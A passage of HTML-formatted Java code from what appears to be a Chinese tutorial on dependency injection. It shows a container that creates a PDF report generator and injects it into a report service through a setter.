margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Table\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;setDate(Date\r\n date) {&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;setMonth(Month\r\n month) {&nbsp;&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">// ------------&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">以下均无甚重要改变</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">&nbsp;-----------------\r\n //</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">interface</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportGenerator\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;generate(Table\r\n table);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ExcelGenerator&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">implements</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportGenerator\r\n {</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ExcelGenerator()\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;2...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&nbsp;ExcelGenerator\r\n ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;generate(Table\r\n table) {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;generate\r\n an Excel report ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;PDFGenerator&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">implements</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportGenerator\r\n {</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;PDFGenerator()\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;2...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&nbsp;PDFGenerator\r\n ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">void</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;generate(Table\r\n table) {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;generate\r\n an PDF report ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//------------&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">以上均无甚重要改变</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">&nbsp;-----------------\r\n //</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Container\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">以键</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">-</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">&#20540;对形式保存各种所需组件</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">&nbsp;<span style=\"padding:0px; margin:0px\">Bean</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">private</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">static</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Map&lt;String,\r\n Object&gt;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">beans</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">;</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Container()\r\n {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;1...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">开始初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&nbsp;Container\r\n ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">beans</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;=&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">new</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;HashMap&lt;String,\r\n Object&gt;();</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">创建、保存具体的报表生起器</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ReportGenerator&nbsp;<span style=\"padding:0px; margin:0px; background:yellow\">reportGenerator</span>&nbsp;=&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">new</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;PDFGenerator();</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">beans</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.put(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;reportGenerator&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">,\r\n reportGenerator);</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">获取、管理</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">的引用</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ReportService reportService =&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">new</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportService();</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">//&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">注入上面已创建的具体</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95); background:yellow\">&nbsp;ReportGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体; background:yellow\">实例</span></span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black; background:yellow\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; reportService.setReportGenerator(reportGenerator);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">beans</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.put(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;reportService&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">,\r\n reportService);</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;5...</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">结束初始化</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&nbsp;Container\r\n ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span>&nbsp;</p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">public</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">static</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;Object\r\n getBean(String id) {</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">out</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.println(</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:宋体\">最后获取服务组件</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">...getBean()\r\n --&gt; &quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&#43; id &#43;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(42,0,255)\">&quot; ...&quot;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">return</span></span><span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(0,0,192)\">beans</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">.get(id);</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp; }</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">}</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px\">&nbsp;</div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(127,0,85)\">class</span></span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;ReportService\r\n {</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;<span style=\"padding:0px; margin:0px\">private&nbsp;static</span>&nbsp;ReportGenerator&nbsp;<span style=\"padding:0px; margin:0px\">generator</span>&nbsp;=&nbsp;<span style=\"padding:0px; margin:0px\">new</span>&nbsp;PDFGenerator();</span></p>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden\">\r\n<span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:black\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:10pt; font-family:'Courier New'; color:rgb(63,127,95)\">//&nbsp;</span><span 